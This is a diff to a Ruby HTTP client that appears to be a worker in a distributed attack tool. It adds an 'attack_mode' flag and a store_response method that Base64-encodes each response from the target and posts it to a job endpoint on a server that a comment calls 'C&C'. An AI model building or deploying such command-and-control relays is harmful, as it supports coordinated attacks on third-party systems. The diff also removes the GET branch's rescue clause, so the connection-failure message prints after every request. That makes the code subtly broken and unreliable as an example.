@@ -89,20 +89,46 @@ class Client
 			end
 		end
 
+		# Set these if they weren't passed in...
+		http_uri ||= @http_uri
+		http_data ||= @http_data
+		http_headers ||= @http_headers
+
+		attack_mode = 'store'
+
 		if @http_method.downcase == "get"
 			begin
-				response = req.get(@http_uri)
-			rescue
+				response = req.get(http_uri)
+
+				store_response(response) if attack_mode == 'store'
 				puts "Unable to connect with get."
 			end
 		else
 			begin
-				response = req.post(@http_uri, @http_data, @http_headers)
+				response = req.post(http_uri, http_data, http_headers)
+
+				store_response(response) if attack_mode == 'store'
 			rescue
 				puts "Unable to connect with post."
 			end
 		end
 	end
+
+	def store_response(response)
+		endpoint = "#{@server}/job/#{@job_id}/saveResponse"
+
+		data = { 
+			:response => Base64.encode64(response.body),
+			:code 		=> response.code.to_i
+		}
+		begin
+		Mechanize.new.post(endpoint, data)
+		rescue
+			# hmm
+		end
+	end
+
+	# Communicates with C&C behind the scenes to look for job status changes
 
 	def monitor_job_status
 		# Let's sleep for a bit first
